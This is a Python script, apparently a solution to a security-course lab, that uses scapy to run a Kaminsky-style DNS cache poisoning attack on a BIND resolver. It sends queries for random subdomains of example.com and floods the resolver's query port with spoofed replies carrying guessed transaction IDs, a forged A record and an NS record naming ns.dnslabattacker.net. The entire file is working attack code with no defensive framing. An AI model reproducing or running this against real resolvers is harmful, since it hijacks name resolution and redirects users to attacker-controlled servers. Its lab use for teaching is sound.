#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
# parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
# dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 65535) # The tx ids from dig show 0-65535 not 0-256

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\nExample Packet:\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

# Send a stream of spoofed DNS replies
def sendSpoofedReplies():
    #3 done = False
    # while not done:
    for attemptNum in range(10000):
        randSub = getRandomSubDomain()
        fakeUrl = '{0}.example.com'.format(randSub)
        # Generate fake responses before sending to save time
        fakeResponses = [DNS(id=getRandomTXID(), qr=1L, aa=1L, tc=0L, rd=1L, 
                             ra=1L, z=0L, ad=0L, cd=0L, nscount=1, ancount=1,
                             qd=DNSQR(qname=fakeUrl),
                             an=DNSRR(rrname=fakeUrl, rdata='1.2.3.4', type='A', ttl=69420),
                             ns=DNSRR(rrname='example.com', rdata='ns.dnslabattacker.net', type='NS', ttl=169420))
                         for x in range(50)]
        # print(fakeResponses[0].summary())
        # print(fakeResponses[4].show())
        # Send the legit query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakeUrl))
        sendPacket(sock, dnsPacket, my_ip, my_port)
        # Flood the BIND server with fake responses
        for fakeResponse in fakeResponses:
            # if attemptNum == 0:
            #    fakeResponse.show()
            sendPacket(sock, fakeResponse, my_ip, my_query_port)
        
        response = sock.recv(4096)
        response = DNS(response)
        # print "\nServer Response:\n***** Packet Received from Remote Server *****"
        # print response.show()
        # print "***** End of Remote Server Packet *****\n"
        # print('Done attempt {0}'.format(attemptNum))
        # if attemptNum % 100 == 0:
            # print('Done attempt {0}'.format(attemptNum))
        # done = True
        
if __name__ == '__main__':
    # exampleSendDNSQuery()
    sendSpoofedReplies()
    